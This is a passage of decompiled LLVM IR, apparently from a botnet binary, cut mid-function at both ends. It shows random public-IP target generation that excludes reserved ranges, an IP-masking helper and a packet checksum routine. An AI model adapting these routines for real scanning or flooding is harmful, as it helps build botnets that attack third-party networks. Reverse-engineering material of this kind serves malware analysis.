  %v3_804993a = phi i32 [ %arg4, %dec_label_pc_804993a.lr.ph ], [ %v3_804993a.pre, %dec_label_pc_804992f.backedge.dec_label_pc_804993a_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_804993a.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_804992f.backedge.dec_label_pc_804993a_crit_edge ]
  %tmp36 = icmp slt i32 %v3_804993a, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br i1 %tmp37, label %dec_label_pc_8049800, label %dec_label_pc_8049948

dec_label_pc_8049948:                             ; preds = %dec_label_pc_804993a
  br i1 %tmp39, label %dec_label_pc_8049800, label %dec_label_pc_8049968

dec_label_pc_804995c:                             ; preds = %dec_label_pc_8049917, %dec_label_pc_80498fc
  br label %dec_label_pc_8049972

dec_label_pc_8049968:                             ; preds = %dec_label_pc_804992f.backedge, %dec_label_pc_8049948, %dec_label_pc_8049800, %entry
  br label %dec_label_pc_8049972

dec_label_pc_8049972:                             ; preds = %dec_label_pc_804995c, %dec_label_pc_80498f0, %dec_label_pc_80498c4, %dec_label_pc_8049883, %dec_label_pc_8049968
  %v3_8049972 = phi i32 [ 1, %dec_label_pc_804995c ], [ 0, %dec_label_pc_80498f0 ], [ 0, %dec_label_pc_80498c4 ], [ 0, %dec_label_pc_8049883 ], [ 0, %dec_label_pc_8049968 ]
  ret i32 %v3_8049972

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_80498ad, { 0, 2, 1 }
  uselistorder i32 %v5_804986c, { 0, 2, 1 }
  uselistorder i32 %v5_804985c, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049972, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049968, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804992f.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8049980 = load i32, i32* @edi, align 4
  %v0_8049982 = load i32, i32* @ebx, align 4
  store i32 %v0_8049982, i32* %stack_var_-16, align 4
  %v3_8049986 = call i32 @random()
  %v2_8049996 = ashr i32 %v3_8049986, 31
  %v2_8049999 = zext i32 %v3_8049986 to i64
  %v4_8049999 = zext i32 %v2_8049996 to i64
  %v5_8049999 = mul nuw i64 %v4_8049999, 4294967296
  %v6_8049999 = or i64 %v5_8049999, %v2_8049999
  %v10_8049999 = srem i64 %v6_8049999, 223
  %v11_8049999 = trunc i64 %v10_8049999 to i32
  store i32 %v11_8049999, i32* @eax, align 4
  %v1_804999d = trunc i64 %v10_8049999 to i8
  store i8 %v1_804999d, i8* @global_var_80584db.35, align 1
  %v0_80499a2 = call i32 @random()
  %v2_80499b2 = ashr i32 %v0_80499a2, 31
  %v2_80499b5 = zext i32 %v0_80499a2 to i64
  %v4_80499b5 = zext i32 %v2_80499b2 to i64
  %v5_80499b5 = mul nuw i64 %v4_80499b5, 4294967296
  %v6_80499b5 = or i64 %v5_80499b5, %v2_80499b5
  %v10_80499b5 = srem i64 %v6_80499b5, 255
  %v11_80499b5 = trunc i64 %v10_80499b5 to i32
  store i32 %v11_80499b5, i32* @eax, align 4
  %v1_80499b9 = trunc i64 %v10_80499b5 to i8
  store i8 %v1_80499b9, i8* @global_var_80584dc.36, align 4
  %v0_80499be = call i32 @random()
  %v2_80499ce = ashr i32 %v0_80499be, 31
  %v2_80499d1 = zext i32 %v0_80499be to i64
  %v4_80499d1 = zext i32 %v2_80499ce to i64
  %v5_80499d1 = mul nuw i64 %v4_80499d1, 4294967296
  %v6_80499d1 = or i64 %v5_80499d1, %v2_80499d1
  %v10_80499d1 = srem i64 %v6_80499d1, 255
  %v11_80499d1 = trunc i64 %v10_80499d1 to i32
  store i32 %v11_80499d1, i32* @eax, align 4
  %v1_80499d5 = trunc i64 %v10_80499d1 to i8
  store i8 %v1_80499d5, i8* @global_var_80584dd.37, align 1
  %v0_80499da = call i32 @random()
  %v2_80499ea = ashr i32 %v0_80499da, 31
  %v2_80499ed = zext i32 %v0_80499da to i64
  %v4_80499ed = zext i32 %v2_80499ea to i64
  %v5_80499ed = mul nuw i64 %v4_80499ed, 4294967296
  %v6_80499ed = or i64 %v5_80499ed, %v2_80499ed
  br label %dec_label_pc_8049a68

dec_label_pc_80499f8:                             ; preds = %dec_label_pc_8049bf1, %dec_label_pc_8049be4, %dec_label_pc_8049bd7, %dec_label_pc_8049bca, %dec_label_pc_8049bbd, %dec_label_pc_8049bb0, %dec_label_pc_8049ba3, %dec_label_pc_8049b96, %dec_label_pc_8049b89, %dec_label_pc_8049b7c, %dec_label_pc_8049b6f, %dec_label_pc_8049b62, %dec_label_pc_8049b55, %dec_label_pc_8049b48, %dec_label_pc_8049b3b, %dec_label_pc_8049b1c, %dec_label_pc_8049b06, %dec_label_pc_8049ae7, %dec_label_pc_8049ac8, %dec_label_pc_8049ab2, %dec_label_pc_8049aa5, %dec_label_pc_8049a98, %dec_label_pc_8049a8b, %dec_label_pc_8049a7e, %dec_label_pc_8049a71, %dec_label_pc_8049a68
  %v0_80499f8 = call i32 @random()
  %v2_8049a08 = ashr i32 %v0_80499f8, 31
  %v2_8049a0b = zext i32 %v0_80499f8 to i64
  %v4_8049a0b = zext i32 %v2_8049a08 to i64
  %v5_8049a0b = mul nuw i64 %v4_8049a0b, 4294967296
  %v6_8049a0b = or i64 %v5_8049a0b, %v2_8049a0b
  %v10_8049a0b = srem i64 %v6_8049a0b, 223
  %v11_8049a0b = trunc i64 %v10_8049a0b to i32
  store i32 %v11_8049a0b, i32* @eax, align 4
  %v1_8049a0f = trunc i64 %v10_8049a0b to i8
  store i8 %v1_8049a0f, i8* @global_var_80584db.35, align 1
  %v0_8049a14 = call i32 @random()
  %v2_8049a24 = ashr i32 %v0_8049a14, 31
  %v2_8049a27 = zext i32 %v0_8049a14 to i64
  %v4_8049a27 = zext i32 %v2_8049a24 to i64
  %v5_8049a27 = mul nuw i64 %v4_8049a27, 4294967296
  %v6_8049a27 = or i64 %v5_8049a27, %v2_8049a27
  %v10_8049a27 = srem i64 %v6_8049a27, 255
  %v11_8049a27 = trunc i64 %v10_8049a27 to i32
  store i32 %v11_8049a27, i32* @eax, align 4
  %v1_8049a2b = trunc i64 %v10_8049a27 to i8
  store i8 %v1_8049a2b, i8* @global_var_80584dc.36, align 4
  %v0_8049a30 = call i32 @random()
  %v2_8049a40 = ashr i32 %v0_8049a30, 31
  %v2_8049a43 = zext i32 %v0_8049a30 to i64
  %v4_8049a43 = zext i32 %v2_8049a40 to i64
  %v5_8049a43 = mul nuw i64 %v4_8049a43, 4294967296
  %v6_8049a43 = or i64 %v5_8049a43, %v2_8049a43
  %v10_8049a43 = srem i64 %v6_8049a43, 255
  %v11_8049a43 = trunc i64 %v10_8049a43 to i32
  store i32 %v11_8049a43, i32* @eax, align 4
  %v1_8049a47 = trunc i64 %v10_8049a43 to i8
  store i8 %v1_8049a47, i8* @global_var_80584dd.37, align 1
  %v0_8049a4c = call i32 @random()
  %v2_8049a5c = ashr i32 %v0_8049a4c, 31
  %v2_8049a5f = zext i32 %v0_8049a4c to i64
  %v4_8049a5f = zext i32 %v2_8049a5c to i64
  %v5_8049a5f = mul nuw i64 %v4_8049a5f, 4294967296
  %v6_8049a5f = or i64 %v5_8049a5f, %v2_8049a5f
  br label %dec_label_pc_8049a68

dec_label_pc_8049a68:                             ; preds = %entry, %dec_label_pc_80499f8
  %v6_80499ed.sink = phi i64 [ %v6_80499ed, %entry ], [ %v6_8049a5f, %dec_label_pc_80499f8 ]
  %v10_80499ed = srem i64 %v6_80499ed.sink, 255
  %extract.t = trunc i64 %v10_80499ed to i8
  %extract.t8 = trunc i64 %v10_80499ed to i32
  store i8 %extract.t, i8* @global_var_80584de.38, align 2
  %v0_8049a68 = load i8, i8* @global_var_80584db.35, align 1
  %v1_8049a68 = zext i8 %v0_8049a68 to i32
  %v3_8049a68 = and i32 %extract.t8, -256
  %v4_8049a68 = or i32 %v1_8049a68, %v3_8049a68
  store i32 %v4_8049a68, i32* @eax, align 4
  %v10_8049a6d = icmp eq i8 %v0_8049a68, 127
  br i1 %v10_8049a6d, label %dec_label_pc_80499f8, label %dec_label_pc_8049a71

dec_label_pc_8049a71:                             ; preds = %dec_label_pc_8049a68
  store i32 %v4_8049a68, i32* @eax, align 4
  %v4_8049a76 = icmp eq i8 %v0_8049a68, 0
  br i1 %v4_8049a76, label %dec_label_pc_80499f8, label %dec_label_pc_8049a7e

dec_label_pc_8049a7e:                             ; preds = %dec_label_pc_8049a71
  store i32 %v4_8049a68, i32* @eax, align 4
  %v10_8049a83 = icmp eq i8 %v0_8049a68, 3
  br i1 %v10_8049a83, label %dec_label_pc_80499f8, label %dec_label_pc_8049a8b

dec_label_pc_8049a8b:                             ; preds = %dec_label_pc_8049a7e
  store i32 %v4_8049a68, i32* @eax, align 4
  %v10_8049a90 = icmp eq i8 %v0_8049a68, 15
  br i1 %v10_8049a90, label %dec_label_pc_80499f8, label %dec_label_pc_8049a98

dec_label_pc_8049a98:                             ; preds = %dec_label_pc_8049a8b
  store i32 %v4_8049a68, i32* @eax, align 4
  %v7_8049a9d = icmp eq i8 %v0_8049a68, 16
  br i1 %v7_8049a9d, label %dec_label_pc_80499f8, label %dec_label_pc_8049aa5

dec_label_pc_8049aa5:                             ; preds = %dec_label_pc_8049a98
  store i32 %v4_8049a68, i32* @eax, align 4
  %v10_8049aaa = icmp eq i8 %v0_8049a68, 56
  br i1 %v10_8049aaa, label %dec_label_pc_80499f8, label %dec_label_pc_8049ab2

dec_label_pc_8049ab2:                             ; preds = %dec_label_pc_8049aa5
  store i32 %v4_8049a68, i32* @eax, align 4
  %v10_8049ab7 = icmp eq i8 %v0_8049a68, 10
  br i1 %v10_8049ab7, label %dec_label_pc_80499f8, label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049ab2
  %v8_8049ac4 = icmp eq i8 %v0_8049a68, -64
  %v1_8049ac6 = icmp eq i1 %v8_8049ac4, false
  br i1 %v1_8049ac6, label %dec_label_pc_8049ad5, label %dec_label_pc_8049ac8

dec_label_pc_8049ac8:                             ; preds = %dec_label_pc_8049abf
  %v0_8049ac8 = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049ac8 = zext i8 %v0_8049ac8 to i32
  %v4_8049ac8 = or i32 %v1_8049ac8, %v3_8049a68
  store i32 %v4_8049ac8, i32* @eax, align 4
  %v11_8049acd = icmp eq i8 %v0_8049ac8, -88
  br i1 %v11_8049acd, label %dec_label_pc_80499f8, label %dec_label_pc_8049ad5

dec_label_pc_8049ad5:                             ; preds = %dec_label_pc_8049ac8, %dec_label_pc_8049abf
  %v2_8049ad5 = phi i32 [ %v4_8049ac8, %dec_label_pc_8049ac8 ], [ %v4_8049a68, %dec_label_pc_8049abf ]
  %v3_8049ad5 = and i32 %v2_8049ad5, -256
  %v4_8049ad5 = or i32 %v3_8049ad5, %v1_8049a68
  %v11_8049ada = icmp eq i8 %v0_8049a68, -84
  %v1_8049adc = icmp eq i1 %v11_8049ada, false
  br i1 %v1_8049adc, label %dec_label_pc_8049af4, label %dec_label_pc_8049ade

dec_label_pc_8049ade:                             ; preds = %dec_label_pc_8049ad5
  %v0_8049ade = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049ade = zext i8 %v0_8049ade to i32
  %v4_8049ade = or i32 %v1_8049ade, %v3_8049ad5
  %tmp32 = icmp ult i8 %v0_8049ade, 16
  br i1 %tmp32, label %dec_label_pc_8049af4, label %dec_label_pc_8049ae7

dec_label_pc_8049ae7:                             ; preds = %dec_label_pc_8049ade
  store i32 %v4_8049ade, i32* @eax, align 4
  %tmp33 = icmp ult i8 %v0_8049ade, 32
  br i1 %tmp33, label %dec_label_pc_80499f8, label %dec_label_pc_8049af4

dec_label_pc_8049af4:                             ; preds = %dec_label_pc_8049ae7, %dec_label_pc_8049ade, %dec_label_pc_8049ad5
  %v2_8049af4 = phi i32 [ %v4_8049ade, %dec_label_pc_8049ae7 ], [ %v4_8049ade, %dec_label_pc_8049ade ], [ %v4_8049ad5, %dec_label_pc_8049ad5 ]
  %v3_8049af4 = and i32 %v2_8049af4, -256
  %v4_8049af4 = or i32 %v3_8049af4, %v1_8049a68
  %v10_8049af9 = icmp eq i8 %v0_8049a68, 100
  %v1_8049afb = icmp eq i1 %v10_8049af9, false
  br i1 %v1_8049afb, label %dec_label_pc_8049b13, label %dec_label_pc_8049afd

dec_label_pc_8049afd:                             ; preds = %dec_label_pc_8049af4
  %v0_8049afd = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049afd = zext i8 %v0_8049afd to i32
  %v4_8049afd = or i32 %v1_8049afd, %v3_8049af4
  %tmp34 = icmp ult i8 %v0_8049afd, 64
  br i1 %tmp34, label %dec_label_pc_8049b13, label %dec_label_pc_8049b06

dec_label_pc_8049b06:                             ; preds = %dec_label_pc_8049afd
  store i32 %v4_8049afd, i32* @eax, align 4
  %tmp35 = icmp ult i8 %v0_8049afd, 127
  br i1 %tmp35, label %dec_label_pc_80499f8, label %dec_label_pc_8049b13

dec_label_pc_8049b13:                             ; preds = %dec_label_pc_8049b06, %dec_label_pc_8049afd, %dec_label_pc_8049af4
  %v2_8049b13 = phi i32 [ %v4_8049afd, %dec_label_pc_8049b06 ], [ %v4_8049afd, %dec_label_pc_8049afd ], [ %v4_8049af4, %dec_label_pc_8049af4 ]
  %v3_8049b13 = and i32 %v2_8049b13, -256
  %v4_8049b13 = or i32 %v3_8049b13, %v1_8049a68
  %v11_8049b18 = icmp eq i8 %v0_8049a68, -87
  %v1_8049b1a = icmp eq i1 %v11_8049b18, false
  br i1 %v1_8049b1a, label %dec_label_pc_8049b29, label %dec_label_pc_8049b1c

dec_label_pc_8049b1c:                             ; preds = %dec_label_pc_8049b13
  %v0_8049b1c = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049b1c = zext i8 %v0_8049b1c to i32
  %v4_8049b1c = or i32 %v1_8049b1c, %v3_8049b13
  store i32 %v4_8049b1c, i32* @eax, align 4
  %v11_8049b21 = icmp eq i8 %v0_8049b1c, -1
  br i1 %v11_8049b21, label %dec_label_pc_80499f8, label %dec_label_pc_8049b29

dec_label_pc_8049b29:                             ; preds = %dec_label_pc_8049b1c, %dec_label_pc_8049b13
  %v2_8049b29 = phi i32 [ %v4_8049b1c, %dec_label_pc_8049b1c ], [ %v4_8049b13, %dec_label_pc_8049b13 ]
  %v3_8049b29 = and i32 %v2_8049b29, -256
  %v4_8049b29 = or i32 %v3_8049b29, %v1_8049a68
  %v11_8049b2e = icmp eq i8 %v0_8049a68, -58
  %v1_8049b30 = icmp eq i1 %v11_8049b2e, false
  br i1 %v1_8049b30, label %dec_label_pc_8049b48, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b29
  %v0_8049b32 = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049b32 = zext i8 %v0_8049b32 to i32
  %v4_8049b32 = or i32 %v1_8049b32, %v3_8049b29
  %tmp36 = icmp ult i8 %v0_8049b32, 18
  br i1 %tmp36, label %dec_label_pc_8049b48, label %dec_label_pc_8049b3b

dec_label_pc_8049b3b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v4_8049b32, i32* @eax, align 4
  %tmp37 = or i8 %v0_8049b32, 1
  %tmp38 = icmp eq i8 %tmp37, 19
  br i1 %tmp38, label %dec_label_pc_80499f8, label %dec_label_pc_8049b48

dec_label_pc_8049b48:                             ; preds = %dec_label_pc_8049b3b, %dec_label_pc_8049b32, %dec_label_pc_8049b29
  %v2_8049b48 = phi i32 [ %v4_8049b32, %dec_label_pc_8049b3b ], [ %v4_8049b32, %dec_label_pc_8049b32 ], [ %v4_8049b29, %dec_label_pc_8049b29 ]
  %v3_8049b48 = and i32 %v2_8049b48, -256
  %v4_8049b48 = or i32 %v3_8049b48, %v1_8049a68
  store i32 %v4_8049b48, i32* @eax, align 4
  %v8_8049b4d = icmp eq i8 %v0_8049a68, -32
  br i1 %v8_8049b4d, label %dec_label_pc_80499f8, label %dec_label_pc_8049b55

dec_label_pc_8049b55:                             ; preds = %dec_label_pc_8049b48
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b5a = icmp eq i8 %v0_8049a68, 6
  br i1 %v10_8049b5a, label %dec_label_pc_80499f8, label %dec_label_pc_8049b62

dec_label_pc_8049b62:                             ; preds = %dec_label_pc_8049b55
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b67 = icmp eq i8 %v0_8049a68, 7
  br i1 %v10_8049b67, label %dec_label_pc_80499f8, label %dec_label_pc_8049b6f

dec_label_pc_8049b6f:                             ; preds = %dec_label_pc_8049b62
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b74 = icmp eq i8 %v0_8049a68, 11
  br i1 %v10_8049b74, label %dec_label_pc_80499f8, label %dec_label_pc_8049b7c

dec_label_pc_8049b7c:                             ; preds = %dec_label_pc_8049b6f
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b81 = icmp eq i8 %v0_8049a68, 21
  br i1 %v10_8049b81, label %dec_label_pc_80499f8, label %dec_label_pc_8049b89

dec_label_pc_8049b89:                             ; preds = %dec_label_pc_8049b7c
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b8e = icmp eq i8 %v0_8049a68, 22
  br i1 %v10_8049b8e, label %dec_label_pc_80499f8, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b89
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049b9b = icmp eq i8 %v0_8049a68, 26
  br i1 %v10_8049b9b, label %dec_label_pc_80499f8, label %dec_label_pc_8049ba3

dec_label_pc_8049ba3:                             ; preds = %dec_label_pc_8049b96
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049ba8 = icmp eq i8 %v0_8049a68, 28
  br i1 %v10_8049ba8, label %dec_label_pc_80499f8, label %dec_label_pc_8049bb0

dec_label_pc_8049bb0:                             ; preds = %dec_label_pc_8049ba3
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049bb5 = icmp eq i8 %v0_8049a68, 29
  br i1 %v10_8049bb5, label %dec_label_pc_80499f8, label %dec_label_pc_8049bbd

dec_label_pc_8049bbd:                             ; preds = %dec_label_pc_8049bb0
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049bc2 = icmp eq i8 %v0_8049a68, 30
  br i1 %v10_8049bc2, label %dec_label_pc_80499f8, label %dec_label_pc_8049bca

dec_label_pc_8049bca:                             ; preds = %dec_label_pc_8049bbd
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049bcf = icmp eq i8 %v0_8049a68, 33
  br i1 %v10_8049bcf, label %dec_label_pc_80499f8, label %dec_label_pc_8049bd7

dec_label_pc_8049bd7:                             ; preds = %dec_label_pc_8049bca
  store i32 %v4_8049b48, i32* @eax, align 4
  %v10_8049bdc = icmp eq i8 %v0_8049a68, 55
  br i1 %v10_8049bdc, label %dec_label_pc_80499f8, label %dec_label_pc_8049be4

dec_label_pc_8049be4:                             ; preds = %dec_label_pc_8049bd7
  store i32 %v4_8049b48, i32* @eax, align 4
  %v11_8049be9 = icmp eq i8 %v0_8049a68, -42
  br i1 %v11_8049be9, label %dec_label_pc_80499f8, label %dec_label_pc_8049bf1

dec_label_pc_8049bf1:                             ; preds = %dec_label_pc_8049be4
  store i32 %v4_8049b48, i32* @eax, align 4
  %v11_8049bf6 = icmp eq i8 %v0_8049a68, -41
  br i1 %v11_8049bf6, label %dec_label_pc_80499f8, label %dec_label_pc_8049bfe

dec_label_pc_8049bfe:                             ; preds = %dec_label_pc_8049bf1
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049c1a = urem i32 %extract.t8, 256
  store i32 %v1_8049c1a, i32* @edx, align 4
  %v0_8049c26 = load i8, i8* @global_var_80584dd.37, align 1
  %v1_8049c26 = zext i8 %v0_8049c26 to i32
  %v0_8049c32 = load i8, i8* @global_var_80584dc.36, align 4
  %v1_8049c32 = zext i8 %v0_8049c32 to i32
  store i32 %v1_8049c32, i32* @ebx, align 4
  %v2_8049c4d = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049c4d, i32* @edi, align 4
  %v7_8049c59 = call i32 @szprintf(i32 %v2_8049c4d, i32 ptrtoint ([12 x i8]* @global_var_8055767.39 to i32), i32 %v1_8049a68, i32 %v1_8049c32, i32 %v1_8049c26, i32 %v1_8049c1a)
  %v1_8049c68 = call i32 @inet_addr(i32 %v2_8049c4d)
  %v2_8049c73 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049c73, i32* @ebx, align 4
  store i32 %v0_8049980, i32* @edi, align 4
  ret i32 %v1_8049c68

; uselistorder directives
  uselistorder i32 %v4_8049b32, { 2, 1, 0 }
  uselistorder i32 %v4_8049afd, { 2, 1, 0 }
  uselistorder i32 %v4_8049ade, { 2, 1, 0 }
  uselistorder i8 %v0_8049a68, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_80584dd.37, { 2, 1, 0 }
  uselistorder i8* @global_var_80584dc.36, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder i8* @global_var_80584db.35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a68, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049c7e = load i32, i32* @global_var_805e748.40, align 8
  %v1_8049c87 = call i32 @ntohl(i32 %v0_8049c7e)
  %v5_8049c8f = and i32 %v1_8049c87, %arg1
  %v1_8049c95 = call i32 @rand_cmwc(i32 %v5_8049c8f)
  %v1_8049c9f = sub i32 -1, %arg1
  %v2_8049ca1 = and i32 %v1_8049c95, %v1_8049c9f
  %v5_8049ca3 = xor i32 %v2_8049ca1, %v5_8049c8f
  ret i32 %v5_8049ca3
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049cad = load i32, i32* @ebx, align 4
  %v4_8049ce133 = add i32 %arg2, -1
  %v9_8049ce134 = sub i32 0, %arg2
  %v10_8049ce135 = and i32 %arg2, %v9_8049ce134
  %v11_8049ce136 = icmp slt i32 %v10_8049ce135, 0
  %v12_8049ce137 = icmp eq i32 %v4_8049ce133, 0
  %v13_8049ce138 = icmp slt i32 %v4_8049ce133, 0
  %v3_8049ce539 = icmp eq i1 %v13_8049ce138, %v11_8049ce136
  %v4_8049ce540 = icmp eq i1 %v12_8049ce137, false
  %v5_8049ce541 = and i1 %v4_8049ce540, %v3_8049ce539
  br i1 %v5_8049ce541, label %dec_label_pc_8049cc1.lr.ph, label %dec_label_pc_8049ce7

dec_label_pc_8049cc1.lr.ph:                       ; preds = %entry
  %v4_8049cc4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8049cc1

dec_label_pc_8049cc1:                             ; preds = %dec_label_pc_8049cc1.lr.ph, %dec_label_pc_8049cc1
  %v4_8049cc4 = phi i32 [ %v4_8049cc4.pre, %dec_label_pc_8049cc1.lr.ph ], [ %v6_8049cc4, %dec_label_pc_8049cc1 ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_8049cc1.lr.ph ], [ %v9_8049cd6, %dec_label_pc_8049cc1 ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_8049cc1.lr.ph ], [ %v4_8049cdd, %dec_label_pc_8049cc1 ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_8049cc1.lr.ph ], [ %v23_8049cd9, %dec_label_pc_8049cc1 ]
  %v3_8049cd342 = phi i32 [ 0, %dec_label_pc_8049cc1.lr.ph ], [ %v6_8049cd3, %dec_label_pc_8049cc1 ]
  %v4_8049cc1 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049cc4 = load i16, i16* %stack_var_4.043, align 2
  %v3_8049cc4 = zext i16 %v2_8049cc4 to i32
  %v5_8049cc4 = and i32 %v4_8049cc4, -65536
  %v6_8049cc4 = or i32 %v5_8049cc4, %v3_8049cc4
  store i32 %v6_8049cc4, i32* @ecx, align 4
  %sext51 = mul i32 %v3_8049cd342, 65536
  %v4_8049cd3 = sdiv i32 %sext51, 65536
  %v6_8049cd3 = add nsw i32 %v3_8049cc4, %v4_8049cd3
  %v11_8049cd3 = icmp ult i32 %v6_8049cd3, %v4_8049cd3
  %v26_8049cd3 = trunc i32 %v6_8049cd3 to i16
  %v7_8049cd6 = zext i1 %v11_8049cd3 to i16
  %v9_8049cd6 = add i16 %v7_8049cd6, %stack_var_-24.045
  %v5_8049cd9 = add i32 %v4_8049cc1, 2
  %v23_8049cd9 = inttoptr i32 %v5_8049cd9 to i16*
  %v4_8049cdd = add i32 %stack_var_8.044, -2
  %v4_8049ce1 = add i32 %stack_var_8.044, -3
  %v9_8049ce1 = sub i32 2, %stack_var_8.044
  %v10_8049ce1 = and i32 %v4_8049cdd, %v9_8049ce1
  %v11_8049ce1 = icmp slt i32 %v10_8049ce1, 0
  %v12_8049ce1 = icmp eq i32 %v4_8049ce1, 0
  %v13_8049ce1 = icmp slt i32 %v4_8049ce1, 0
  %v3_8049ce5 = icmp eq i1 %v13_8049ce1, %v11_8049ce1
  %v4_8049ce5 = icmp eq i1 %v12_8049ce1, false
  %v5_8049ce5 = and i1 %v4_8049ce5, %v3_8049ce5
  br i1 %v5_8049ce5, label %dec_label_pc_8049cc1, label %dec_label_pc_8049ce7

dec_label_pc_8049ce7:                             ; preds = %dec_label_pc_8049cc1, %entry
  %v3_8049cd3.lcssa = phi i16 [ 0, %entry ], [ %v26_8049cd3, %dec_label_pc_8049cc1 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8049cd9, %dec_label_pc_8049cc1 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_8049cdd, %dec_label_pc_8049cc1 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_8049cd6, %dec_label_pc_8049cc1 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_8049d2b.preheader, label %dec_label_pc_8049ced

dec_label_pc_8049ced:                             ; preds = %dec_label_pc_8049ce7
  %v1_8049cf0 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049cf0 = load i8, i8* %v1_8049cf0, align 1
  %v3_8049cf0 = zext i8 %v2_8049cf0 to i32
  %v4_8049cf0 = load i32, i32* @ecx, align 4
  %v5_8049cf0 = and i32 %v4_8049cf0, -256
  %v6_8049cf0 = or i32 %v5_8049cf0, %v3_8049cf0
  store i32 %v6_8049cf0, i32* @ecx, align 4
  %v4_8049cfe = sext i16 %v3_8049cd3.lcssa to i32
  %v6_8049cfe = add nsw i32 %v3_8049cf0, %v4_8049cfe
  %v11_8049cfe = icmp ult i32 %v6_8049cfe, %v4_8049cfe
  %v26_8049cfe = trunc i32 %v6_8049cfe to i16
  %v7_8049d01 = zext i1 %v11_8049cfe to i16
  %v9_8049d01 = add i16 %v7_8049d01, %stack_var_-24.0.lcssa
  br label %dec_label_pc_8049d2b.preheader

dec_label_pc_8049d2b.preheader:                   ; preds = %dec_label_pc_8049ced, %dec_label_pc_8049ce7
  %v3_8049d10.ph = phi i16 [ %v3_8049cd3.lcssa, %dec_label_pc_8049ce7 ], [ %v26_8049cfe, %dec_label_pc_8049ced ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049ce7 ], [ %v9_8049d01, %dec_label_pc_8049ced ]
  %v4_8049d2b20 = sext i16 %v3_8049d10.ph to i32
  %v4_8049d2e21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_8049d3122 = udiv i32 %v4_8049d2b20, 65536
  %v4_8049d3123 = mul i32 %v4_8049d2e21, 65536
  %v5_8049d3124 = or i32 %v4_8049d3123, %v3_8049d3122
  %v2_8049d3525 = udiv i32 %v4_8049d2e21, 65536
  %v2_8049d3826 = or i32 %v5_8049d3124, %v2_8049d3525
  %v3_8049d3827 = icmp eq i32 %v2_8049d3826, 0
  %v1_8049d3c28 = icmp eq i1 %v3_8049d3827, false
  br i1 %v1_8049d3c28, label %dec_label_pc_8049d06, label %dec_label_pc_8049d3e

dec_label_pc_8049d06:                             ; preds = %dec_label_pc_8049d2b.preheader, %dec_label_pc_8049d06
  %v2_8049d3531 = phi i32 [ %v2_8049d35, %dec_label_pc_8049d06 ], [ %v2_8049d3525, %dec_label_pc_8049d2b.preheader ]
  %v5_8049d3130 = phi i32 [ %v5_8049d31, %dec_label_pc_8049d06 ], [ %v5_8049d3124, %dec_label_pc_8049d2b.preheader ]
  %v4_8049d2b29 = phi i32 [ %v4_8049d2b, %dec_label_pc_8049d06 ], [ %v4_8049d2b20, %dec_label_pc_8049d2b.preheader ]
  %v2_8049d21 = add i32 %v5_8049d3130, %v4_8049d2b29
  %v7_8049d21 = icmp ult i32 %v2_8049d21, %v4_8049d2b29
  %v3_8049d23 = zext i1 %v7_8049d21 to i32
  %v5_8049d23 = add nuw nsw i32 %v3_8049d23, %v2_8049d3531
